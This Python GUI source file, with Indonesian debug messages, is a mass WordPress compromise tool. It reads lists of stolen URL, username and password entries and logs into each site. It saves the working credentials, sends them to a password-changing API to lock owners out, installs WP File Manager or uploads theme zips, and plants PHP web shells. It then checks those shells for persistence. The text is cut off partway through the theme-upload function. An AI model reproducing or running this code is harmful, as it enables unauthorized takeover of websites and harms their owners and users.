import sys
import re
import os
os.environ["QT_LOGGING_RULES"] = "*.debug=false;*.warning=false"
import requests
import logging
import json
import random
import time
import chardet
import string
import threading
from datetime import datetime
from requests.auth import HTTPBasicAuth
from urllib.parse import urlparse, unquote, urljoin
from requests.exceptions import Timeout, RequestException
import warnings
import urllib3
from queue import Queue

# Non-Standard Library Imports (ensure they are installed)
try:
    from bs4 import BeautifulSoup
    from colorama import Fore
except ImportError:
    print("Required modules are missing. Please run: pip install beautifulsoup4 colorama requests chardet")
    sys.exit(1)

from concurrent.futures import ThreadPoolExecutor, as_completed

# PyQt5 Imports
from PyQt5.QtCore import QEvent, QSize, Qt, QPoint, QObject, pyqtSignal, QThread, QUrl, QByteArray, QTimer
from PyQt5.QtGui import QIcon, QFont, QPixmap, QColor, QDesktopServices, QImage, QBrush
from PyQt5.QtWidgets import (
    QMessageBox, QStyle, QApplication, QMainWindow, QAction, QToolButton,
    QVBoxLayout, QWidget, QToolBar, QCheckBox, QHBoxLayout, QMenuBar,
    QSpacerItem, QSizePolicy, QTreeWidget, QTreeWidgetItem, QTabWidget,
    QHeaderView, QLineEdit, QLabel, QTableWidget, QStatusBar, QFileDialog,
    QInputDialog, QTableWidgetItem, QFrame, QStackedWidget, QSplitter,
    QGraphicsDropShadowEffect, QDialog, QPushButton
)

# Initial Configuration
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.simplefilter('ignore', requests.packages.urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(
    filename='app.log',
    level=logging.INFO,
    format='%(asctime)s - %(threadName)s - %(levelname)s - %(message)s'
)


# --- ICONS ---
ICONS = {
    "dashboard": '''<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg>''',
    "webshell": '''<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="8.5" cy="7" r="4"></circle><polyline points="17 11 19 13 23 9"></polyline></svg>''',
    "worker": '''<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><polygon points="16.24 7.76 14.12 14.12 7.76 16.24 9.88 9.88 16.24 7.76"></polygon></svg>''',
    "info": '''<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#54a0ff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>''',
    "success_check": '''<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#26de81" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>''',
    "warning": '''<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ffc107" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>''',
    "load": '''<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="17 8 12 3 7 8"></polyline><line x1="12" y1="3" x2="12" y2="15"></line></svg>''',
    "start": '''<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>''',
    "stop": '''<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><rect x="3" y="3" width="18" height="18"></rect></svg>''',
    "checked": '''<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#b0bec5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>''',
    "valid": '''<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#26de81" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>''',
    "invalid": '''<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ff5252" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg>''',
    "shell": '''<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#9C27B0" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 17l6-6-6-6m8 12h12"></path></svg>''',
    "menu": '''<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>''',
    "minimize": '''<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#b0bec5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"></line></svg>''',
    "maximize": '''<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#b0bec5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect></svg>''',
    "restore": '''<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#b0bec5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="8" y="8" width="13" height="13" rx="2" ry="2"></rect><path d="M4 15V4a2 2 0 0 1 2-2h11"></path></svg>''',
    "close": '''<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#b0bec5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>''',
}

# --- STYLESHEET ---
STYLESHEET = """
    /* General */
    QMainWindow, QWidget {
        font-family: "Roboto", "Segoe UI", sans-serif;
        color: #e0e0e0;
        background-color: #202123; /* Dark background */
    }
    *:focus {
        outline: none; /* Remove focus rectangle globally */
    }
    QSplitter::handle {
        background-color: transparent;
        width: 1px;
    }

    /* --- UPDATED SIDEBAR STYLES --- */
    #Sidebar {
        background-color: #2A2D35; /* Sidebar slightly lighter */
        border-right: 1px solid #40414f;
    }
    .NavButton {
        background-color: transparent;
        border: 1px solid transparent;
        border-radius: 10px;
        margin: 4px; /* Spacing between buttons */
    }
    .NavButton:hover {
        background-color: #343541;
    }
    .NavButton:checked {
        background-color: #40414f;
    }
    QToolTip {
        background-color: #202123;
        color: #e0e0e0;
        border: 1px solid #40414f;
        padding: 5px;
        border-radius: 4px;
    }

    /* Header / Title Bar */
    #PageTitleLabel {
        color: #ffffff;
        font-size: 26px;
        font-weight: 600;
    }
    #WindowButton {
        background: transparent;
        border: none;
        border-radius: 8px;
        padding: 4px;
    }
    #WindowButton:hover {
        background-color: #343541;
    }
    #CloseButton:hover {
        background-color: #E81123;
    }

    /* CARD & TABLE STYLES */
    .StatCard {
        background-color: #2A2D35;
        border-radius: 12px;
        border: none;
    }
    .StatValueLabel {
        color: #ffffff;
        font-size: 28px;
        font-weight: 600;
        padding-top: 5px;
    }
    .StatTitleLabel {
        color: #b0bec5;
        font-size: 13px;
        font-weight: 500;
        text-transform: uppercase;
    }

    QTableWidget {
        background-color: #2A2D35;
        border-radius: 12px;
        color: #b0bec5;
        gridline-color: transparent;
        border: none;
    }
    QTableWidget::item {
        padding: 14px 12px;
        border: none;
        border-bottom: 1px solid #40414f;
    }
    QTableWidget::item:selected {
        background-color: #40414f;
        color: #ffffff;
    }
    QHeaderView::section {
        background-color: #2A2D35;
        color: #ffffff;
        font-weight: 600;
        font-size: 14px;
        padding: 12px;
        border: none;
        border-bottom: 2px solid #40414f;
    }

    /* Buttons and Inputs */
    .ActionButton {
        color: white;
        border: none;
        border-radius: 8px;
        font-weight: 500;
        padding: 10px 18px;
        font-size: 14px;
    }
    #LoadButton, #StartButton {
        background-color: #40414f;
    }
    #LoadButton:hover, #StartButton:hover {
        background-color: #4F5368;
    }
    #StopButton {
        background-color: #d32f2f;
    }
    #StopButton:hover {
        background-color: #e57373;
    }
    #WorkerSettingsGroup QLineEdit {
        background-color: #2A2D35;
        border: 1px solid #40414f;
        border-radius: 8px;
        padding: 9px;
        color: #e0e0e0;
        font-size: 14px;
    }
    #WorkerSettingsGroup QLineEdit:focus {
        border: 1px solid #4F5368;
    }
    #WorkerSettingsGroup QCheckBox {
        color: #b0bec5;
        font-size: 14px;
        margin-left: 10px;
    }
    QCheckBox::indicator {
        border: 1px solid #555555;
        background-color: #2A2D35;
        border-radius: 4px;
        width: 18px;
        height: 18px;
    }
    QCheckBox::indicator:checked {
        background-color: #4F5368;
        border-color: #5a5e73;
    }

    /* Scrollbar */
    QScrollBar:vertical {
        border: none;
        background: #202123;
        width: 12px;
        margin: 0;
    }
    QScrollBar::handle:vertical {
        background: #40414f;
        min-height: 25px;
        border-radius: 6px;
    }
    QScrollBar::handle:vertical:hover {
        background: #4F5368;
    }
"""

class CheckerSignals(QObject):
    update_table = pyqtSignal(str, str, str, str)
    stats_update = pyqtSignal(str, int, int, int, int, int)
    shell_uploaded = pyqtSignal(str)
    task_finished = pyqtSignal(str, str)


class PersistentShellChecker(QThread):
    shell_status_checked = pyqtSignal(int, str, QColor)

    def __init__(self):
        super().__init__()
        self.task_queue = Queue()
        self.is_running = True

    def run(self):
        while self.is_running:
            try:
                row, url = self.task_queue.get()
                if url is None: break
                try:
                    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
                    response = requests.get(url, timeout=10, verify=False, headers=headers)
                    if response.status_code == 200 and ('kom.php' in response.text or 'ALFA TEaM Shell' in response.text or 'Tesla' in response.text):
                        self.shell_status_checked.emit(row, 'Aktif', QColor("#2ecc71"))
                    else:
                        self.shell_status_checked.emit(row, 'Tidak Aktif', QColor("#e74c3c"))
                except requests.RequestException:
                    self.shell_status_checked.emit(row, 'Error', QColor("#f39c12"))
            except Exception as e:
                logging.error(f"Error in PersistentShellChecker: {e}")

    def add_task(self, row, url): self.task_queue.put((row, url))
    def stop(self):
        self.is_running = False
        self.task_queue.put((-1, None))
        self.wait()


class ExtractWorker(QThread):
    def __init__(self, signals, combo_files):
        super().__init__()
        self.signals = signals
        self.combo_files = combo_files
        self.extracted_lines = []

    @staticmethod
    def ensure_valid_scheme(url: str) -> str:
        url = url.strip()
        if not re.match(r'^(?:http)s?://', url):
            url = 'https://' + url
        return url

    def parse_combo_line(self, line: str):
        try:
            line = line.strip()
            if '|' in line: parts = line.split('|', 2)
            else: parts = line.rsplit(':', 2)
            if len(parts) < 3: return (None, None, None)
            url, user, password = parts[0], parts[1], ":".join(parts[2:])
            url = self.ensure_valid_scheme(url)
            return (url, user, password)
        except Exception as e:
            logging.debug(f'Error processing line: {line!r} | {e}')
            return (None, None, None)

    def worker_function(self, file_path):
        try:
            with open(file_path, 'rb') as raw_file:
                encoding = chardet.detect(raw_file.read(4096))['encoding'] or 'utf-8'
            with open(file_path, 'r', encoding=encoding, errors='replace') as f:
                for line in f:
                    if line.strip():
                        url, user, password = self.parse_combo_line(line)
                        if url and user and password: self.extracted_lines.append((url, user, password))
        except Exception as e:
            logging.error(f'Error processing file {file_path}: {e}')

    def run(self):
        for file in self.combo_files: self.worker_function(file)


class CheckerWorker(QThread):
    BATCH_UPDATE_SIZE = 25

    def __init__(self, task_id, active_checker, timeout, signals, extracted_lines):
        super().__init__()
        self.task_id = task_id
        self.active_checker = active_checker
        self.timeout = timeout
        self.signals = signals
        self.extracted_lines = extracted_lines
        self.is_running = True
        self.total_checked = 0
        self.total_valid = 0
        self.total_shells_uploaded = 0
        self.lock = threading.Lock()

        self.FILE_PATH = r'pawnd/kom.php'
        self.OUTPUT_FILE = r'results/aspire-shell.txt'
        self.LOGIN_PATH = '/login_up.php'
        self.WEB_DOMAINS_PATH = '/smb/web/view'
        self.FILE_MANAGER_PATH = '/smb/file-manager/list'

    def stop(self): self.is_running = False
    def get_lines_generator(self):
        for line in self.extracted_lines: yield line

    @staticmethod
    def ensure_valid_scheme(url):
        if not url.startswith(('http://', 'https://')): return 'https://' + url
        return url

    def save_into_file(self, filename, content):
        with self.lock:
            with open(f'results/{filename}', 'a', encoding='utf-8') as f: f.write(f'{content}\n')

    def upload_success_handler(self, shell_url):
        with self.lock: self.total_shells_uploaded += 1
        self.signals.shell_uploaded.emit(shell_url)

    def check_files(self, *files):
        """Memeriksa apakah semua file yang dibutuhkan ada."""
        for f in files:
            if not os.path.exists(f):
                logging.warning(f"File yang dibutuhkan tidak ditemukan: {f}")
                return False
        return True

    def clean_url(self, url):
        """Clean URL from unwanted characters"""
        print(f"[DEBUG] Original URL: {url}")
        
        # Remove everything after wp-login.php if there are extra parameters
        if '/wp-login.php' in url:
            url_parts = url.split('/wp-login.php')
            url = url_parts[0] + '/wp-login.php'
        
        # Remove any fragments and unwanted characters
        url = url.split('#')[0].split('?')[0]
        
        # Remove any credentials that might be in the URL
        if '@' in url:
            protocol_part = url.split('://')[0] + '://'
            domain_part = url.split('://')[1].split('@')[-1]
            url = protocol_part + domain_part
        
        # Ensure it starts with http:// or https://
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        print(f"[DEBUG] Cleaned URL: {url}")
        return url

    def ensure_valid_scheme(self, url):
        """Ensure URL has valid scheme"""
        if url.startswith('http://') or url.startswith('https://'):
            return url
        return 'https://' + url

    def check_wp_login(self, url, username, password, themes_zip='pawnd/themes.zip', plugins_zip='pawnd/plugin.zip', auto_change_password=True):
        try:
            # Clean the URL first
            url = self.clean_url(url)
            url = self.ensure_valid_scheme(url)
            
            print(f"[DEBUG] Memulai check_wp_login untuk: {url}")
            print(f"[DEBUG] Username: {username}, Password: {password}")
            
            os.makedirs('results', exist_ok=True)
            
            # Ensure URL ends with wp-login.php
            if not url.endswith('/wp-login.php'):
                if url.endswith('/'):
                    login_url = url + 'wp-login.php'
                else:
                    login_url = url + '/wp-login.php'
            else:
                login_url = url
            
            print(f"[DEBUG] Login URL: {login_url}")
            
            payload = {'log': username, 'pwd': password, 'wp-submit': 'Log In'}
            
            print(f"[DEBUG] Mencoba login ke: {login_url}")
            try:
                response = requests.post(login_url, data=payload, timeout=30, verify=False)
                print(f"[DEBUG] Response status code: {response.status_code}")
                print(f"[DEBUG] Response headers: {dict(response.headers)}")
            except requests.exceptions.Timeout:
                print("[DEBUG] Timeout saat login")
                return False
            except requests.exceptions.ConnectionError as e:
                print(f"[DEBUG] Connection error: {e}")
                return False
            
            success = False
            login_indicators = []
            
            # Check multiple login success indicators
            if 'Dashboard' in response.text or 'dashboard' in response.text.lower():
                print("[DEBUG] Login berhasil - Dashboard ditemukan")
                login_indicators.append("Dashboard")
                success = True
                with open('results/wp-work.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{url}#{username}@{password}\n')
            
            if 'WP File Manager' in response.text or 'wp-file-manager' in response.text.lower():
                print("[DEBUG] WP File Manager ditemukan")
                login_indicators.append("WP File Manager")
                success = True
                with open('results/wpfilemanager.txt', 'a', encoding='utf-8') as fm:
                    fm.write(f'{url}#{username}@{password}\n')
            
            soup = BeautifulSoup(response.content, 'html.parser')
            if soup.find('a', {'href': 'plugin-install.php'}) or soup.find('a', {'href': '/wp-admin/plugin-install.php'}):
                print("[DEBUG] Plugin install link ditemukan")
                login_indicators.append("Plugin Install")
                success = True
                with open('results/wp-login.txt', 'a', encoding='utf-8') as file:
                    file.write(f'{url}:{username}:{password}\n')
            
            # Additional indicators
            if 'admin' in response.text.lower() and ('logout' in response.text.lower() or 'log out' in response.text.lower()):
                print("[DEBUG] Admin area detected")
                login_indicators.append("Admin Area")
                success = True
            
            if response.status_code == 302 and 'admin' in response.headers.get('Location', ''):
                print("[DEBUG] Redirect to admin detected")
                login_indicators.append("Admin Redirect")
                success = True
            
            print(f"[DEBUG] Login indicators found: {login_indicators}")
            
            if success:
                print("[DEBUG] Login sukses, melanjutkan proses...")
                session = requests.Session()
                
                # Set cookies from login response
                session.cookies.update(response.cookies)
                
                # Auto change password functionality using the new API method
                if auto_change_password:
                    print("[DEBUG] Auto change password via API diaktifkan")
                    # We pass the original login_url, username, and password to the API
                    if not self.change_wordpress_password_api(login_url, username, password):
                        print("[DEBUG] Gagal mengubah password via API.")
                
                if not self.check_files(themes_zip, plugins_zip):
                    print(f"[DEBUG] File check: themes={os.path.exists(themes_zip)}, plugins={os.path.exists(plugins_zip)}")
                    return True
                
                # Clean URL for further operations
                base_url = url.replace('/wp-login.php', '')
                if base_url.endswith('/'):
                    base_url = base_url[:-1]
                print(f"[DEBUG] Base URL untuk upload: {base_url}")
                
                print("[DEBUG] Mencoba upload themes...")
                themes_success = self.upload_themes(session, base_url, themes_zip)
                
                if not themes_success:
                    print("[DEBUG] Upload themes gagal, mencoba install WP File Manager")
                    if self.install_wpfilemanager(session, base_url):
                        print("[DEBUG] WP File Manager berhasil diinstall")
                        shell_success = self.upload_shell(session, base_url)
                        if shell_success:
                            print("[DEBUG] Shell berhasil diupload via WP File Manager")
                    else:
                        print("[DEBUG] Gagal install WP File Manager")
                
                return True
            else:
                print("[DEBUG] Login gagal - tidak ada indicator yang ditemukan")
                # Save failed attempts for analysis
                with open('results/failed_logins.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{url}:{username}:{password} - Status: {response.status_code}\n')
                return False
            
        except Exception as e:
            print(f"[ERROR] Exception di check_wp_login: {e}")
            import traceback
            traceback.print_exc()
            return False

    def change_wordpress_password_api(self, login_url, username, password):
        """
        Changes WordPress password by sending a request to the Flask API.
        The payload format is matched with the API's /process_json endpoint.
        """
        api_endpoint = "http://192.168.100.83:8000/process_json"
        
        # Construct the payload as expected by the API
        payload = {
            "accounts": [
                {
                    "url": login_url,
                    "username": username,
                    "password": password
                }
            ]
        }

        try:
            print(f"[DEBUG] Calling password change API for: {login_url} with user: {username}")
            
            # Make a POST request with the JSON payload
            response = requests.post(api_endpoint, json=payload, timeout=45, verify=False)

            if response.status_code == 200:
                try:
                    data = response.json()
                    # Check if the response format matches the API's successful output
                    if "results" in data and isinstance(data["results"], list) and len(data["results"]) > 0:
                        result = data["results"][0]  # Get the result for our single account
                        if result.get("success"):
                            new_password = result.get("new_password")
                            print(f"[SUCCESS] API Password Change Success | URL: {result.get('url')} | User: {result.get('username')} | New Pass: {new_password}")
                            # Save the result to a specific file for API changes
                            with self.lock:
                                with open('results/password_changed_api.txt', 'a', encoding='utf-8') as f:
                                    f.write(f"{result.get('url')}:{result.get('username')}:{new_password}\n")
                            return True
                        else:
                            error_message = result.get("message", "API returned success=false")
                            print(f"[DEBUG] API password change failed for {username}: {error_message}")
                            return False
                    else:
                        print(f"[DEBUG] API returned unexpected success response format: {response.text}")
                        return False
                except json.JSONDecodeError:
                    print(f"[ERROR] Failed to decode JSON response from API: {response.text}")
                    return False
            else:
                print(f"[DEBUG] API request failed with status code {response.status_code}: {response.text}")
                return False

        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Exception calling password change API: {e}")
            return False

    def random_name_generator(self):
        let = 'abcdefghijklmnopqrstuvwxyz1234567890'
        name = ''.join((random.choice(let) for _ in range(8)))
        print(f"[DEBUG] Random name generated: {name}")
        return name

    def check_files(self, themes_zip, plugins_zip):
        themes_exists = os.path.exists(themes_zip)
        plugins_exists = os.path.exists(plugins_zip)
        result = themes_exists and plugins_exists
        print(f"[DEBUG] check_files: themes={themes_exists}, plugins={plugins_exists}, result={result}")
        return result

    def get_nonce(self, session, url, type):
        print(f"[DEBUG] Mencari nonce untuk type: {type}")
        path_map = {
            'plugin': '/wp-admin/plugin-install.php', 
            'themes': '/wp-admin/theme-install.php', 
            'upload': '/wp-admin/admin.php?page=wp_file_manager', 
            'wpfilemanager': '/wp-admin/plugin-install.php?s=file+manager&tab=search&type=term'
        }
        path = path_map.get(type, '/wp-admin/plugin-install.php')
        try:
            full_url = url + path
            print(f"[DEBUG] Mengakses URL untuk nonce: {full_url}")
            response = session.get(full_url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}, verify=False, timeout=15)
            print(f"[DEBUG] Response status: {response.status_code}")
            response_text = response.text
            
            if response.status_code != 200:
                print(f"[DEBUG] Gagal mengakses halaman, status: {response.status_code}")
                return None
                
            print(f"[DEBUG] Response length: {len(response_text)}")
            
            # Save response for debugging
            with open('results/debug_response.html', 'w', encoding='utf-8') as f:
                f.write(response_text)
            
            nonce = None
            patterns = []
            
            if type in ('plugin', 'themes'):
                patterns = [
                    'name="_wpnonce" value="([a-f0-9]+)"',
                    'id="_wpnonce" value="([a-f0-9]+)"',
                    '_wpnonce" value="([a-f0-9]+)"',
                    'nonce" value="([a-f0-9]+)"'
                ]
            elif type == 'upload':
                response_text = response_text.replace('\\/', '/')
                patterns = [
                    '"nonce":"([a-f0-9]+)"',
                    'nonce":"([a-f0-9]+)"',
                    'fmfparams.*?"nonce":"([a-f0-9]+)"'
                ]
            else:  # wpfilemanager
                if 'wp-file-manager' in response_text.lower() or 'wp_file_manager' in response_text:
                    print("[DEBUG] WP File Manager reference ditemukan")
                
                patterns = [
                    '"ajax_nonce":"([a-f0-9]+)"',
                    'ajax_nonce" value="([a-f0-9]+)"',
                    '_ajax_nonce" value="([a-f0-9]+)"',
                    'nonce":"([a-f0-9]+)"'
                ]
            
            for pattern in patterns:
                match = re.search(pattern, response_text)
                if match:
                    nonce = match.group(1)
                    print(f"[DEBUG] Found nonce dengan pattern: {pattern} -> {nonce}")
                    break
            
            if not nonce:
                print("[DEBUG] Nonce tidak ditemukan dengan patterns biasa, mencoba mencari secara manual")
                # Manual search for nonce-like patterns
                nonce_candidates = re.findall(r'[a-f0-9]{10,}', response_text)
                for candidate in nonce_candidates:
                    if len(candidate) in [10, 16, 32]:  # Common nonce lengths
                        print(f"[DEBUG] Nonce candidate: {candidate}")
                        # Could be a nonce, but we need to verify
            
            print(f"[DEBUG] Nonce akhir: {nonce}")
            return nonce
            
        except requests.exceptions.Timeout:
            print("[DEBUG] Timeout saat mencari nonce")
            return None
        except Exception as e:
            print(f"[ERROR] Exception di get_nonce: {e}")
            import traceback
            traceback.print_exc()
            return None

    def get_cookies(self, session, url):
        try:
            print(f"[DEBUG] Mendapatkan cookies dari: {url}")
            response = session.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}, verify=False, timeout=10)
            cookies = dict(response.cookies)
            print(f"[DEBUG] Cookies yang didapat: {len(cookies)} cookies: {cookies}")
            return cookies
        except requests.exceptions.Timeout:
            print("[DEBUG] Timeout saat mendapatkan cookies")
            return None
        except Exception as e:
            print(f"[ERROR] Exception di get_cookies: {e}")
            return None

    def upload_shell(self, session, url):
        print(f"[DEBUG] Memulai upload_shell ke: {url}")
        shell_name = self.random_name_generator() + '.php'
        nonce = self.get_nonce(session, url, 'upload')
        
        if not nonce:
            print("[DEBUG] Gagal mendapatkan nonce untuk upload, mencoba alternative methods")
            return False
        
        print(f"[DEBUG] Nonce untuk upload: {nonce}")
        data = {
            'reqid': '18efa290e4235', 
            'cmd': 'upload', 
            'target': 'l1_Lw', 
            'action': 'mk_file_folder_manager', 
            '_wpnonce': nonce, 
            'networkhref': '', 
            'mtime[]': int(time.time())
        }
        
        try:
            # Check if shell file exists
            if not os.path.exists('pawnd/shell.php'):
                print("[DEBUG] File shell.php tidak ditemukan di pawnd/shell.php")
                return False
                
            files = {'upload[]': (shell_name, open('pawnd/shell.php', 'rb'), 'application/x-php')}
            
            # Check if file already exists
            check_url = url + f'/wp-admin/admin-ajax.php?action=mk_file_folder_manager&_wpnonce={nonce}&networkhref=&cmd=ls&target=l1_Lw&intersect[]={shell_name}&reqid=18efa290e4235'
            print(f"[DEBUG] Checking existing file: {check_url}")
            response = session.get(check_url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}).json()
            
            if response and 'list' in response and response['list']:
                data[f"hashes[{list(response['list'].keys())[0]}]"] = shell_name
            
            print("[DEBUG] Mengupload shell...")
            upload = session.post(
                url + '/wp-admin/admin-ajax.php', 
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}, 
                timeout=15, 
                verify=False, 
                data=data, 
                files=files
            )
            print(f"[DEBUG] Upload response status: {upload.status_code}")
            
            if upload.status_code == 200:
                upload_json = upload.json()
                print(f"[DEBUG] Upload response: {upload_json}")
                
                if 'added' in upload_json and upload_json['added']:
                    shell_path = ''
                    for text in upload_json['added']:
                        if 'url' in text:
                            shell_path = text['url']
                            break
                    
                    if shell_path:
                        print(f"[DEBUG] Shell uploaded to: {shell_path}")
                        # Verify shell
                        try:
                            check_shell = requests.get(shell_path, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}, timeout=10, verify=False)
                            if check_shell.status_code == 200:
                                shell_content = check_shell.text
                                if any(keyword in shell_content for keyword in ['ALFA', 'Tesla', 'shell', 'Shell', '<?php']):
                                    print("[DEBUG] Shell berhasil diupload dan diverifikasi")
                                    with open('results/shells.txt', 'a', encoding='utf-8') as f:
                                        f.write(f"{shell_path}\n")
                                    self.total_shells_uploaded += 1
                                    return True
                        except Exception as e:
                            print(f"[DEBUG] Gagal verifikasi shell: {e}")
            else:
                print(f"[DEBUG] Upload gagal dengan status: {upload.status_code}")
                
        except Exception as e:
            print(f"[ERROR] Exception di upload_shell: {e}")
            import traceback
            traceback.print_exc()
        
        return False

    def install_wpfilemanager(self, session, url):
        print(f"[DEBUG] Memulai install_wpfilemanager di: {url}")
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': url + '/wp-admin/plugin-install.php'
        }
        data = {'slug': 'wp-file-manager', 'action': 'install-plugin', '_ajax_nonce': ''}
        try:
            nonce = self.get_nonce(session, url, 'wpfilemanager')
            if not nonce:
                print("[DEBUG] Gagal mendapatkan nonce untuk WP File Manager")
                return False
                
            print(f"[DEBUG] Nonce untuk WP File Manager: {nonce}")
            data['_ajax_nonce'] = nonce
            
            install_url = url + '/wp-admin/admin-ajax.php'
            print(f"[DEBUG] Install URL: {install_url}")
            
            response = session.post(install_url, headers=headers, timeout=30, verify=False, data=data)
            print(f"[DEBUG] Install response status: {response.status_code}")
            
            if response.status_code == 200:
                response_data = response.json()
                print(f"[DEBUG] Install response: {response_data}")
                
                if response_data.get('success'):
                    activate_url = response_data.get('data', {}).get('activateUrl', '')
                    if activate_url:
                        print(f"[DEBUG] Activate URL: {activate_url}")
                        activate_response = session.get(activate_url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}, timeout=10)
                        if activate_response.status_code == 200:
                            print("[DEBUG] WP File Manager berhasil diinstall dan diaktifkan")
                            with open('results/wpfilemanager_installed.txt', 'a', encoding='utf-8') as f:
                                f.write(f"{url}\n")
                            return True
                    else:
                        print("[DEBUG] Berhasil install tapi tidak ada activate URL")
                else:
                    print(f"[DEBUG] Install gagal: {response_data.get('data', 'Unknown error')}")
            else:
                print(f"[DEBUG] Install gagal, status: {response.status_code}")
                
        except requests.exceptions.Timeout:
            print("[DEBUG] Timeout saat install WP File Manager")
        except Exception as e:
            print(f"[ERROR] Exception di install_wpfilemanager: {e}")
            import traceback
            traceback.print_exc()
        return False

    def upload_themes(self, session, url, themes_zip):
        print(f"[DEBUG] Memulai upload_themes ke: {url}")
        nonce = self.get_nonce(session, url, 'themes')
        if not nonce:
            print("[DEBUG] Gagal mendapatkan nonce untuk themes")
            return False
            
        print(f"[DEBUG] Nonce untuk themes: {nonce}")
        data = {
            '_wpnonce': nonce,
            '_wp_http_referer': '/wp-admin/theme-install.php',
            'install-theme-submit': 'Installer'
        }
        
        if not os.path.exists(themes_zip):
            print(f"[DEBUG] File themes tidak ditemukan: {themes_zip}")
            return False
            
        theme_name = self.random_name_generator() + '.zip'
        try:
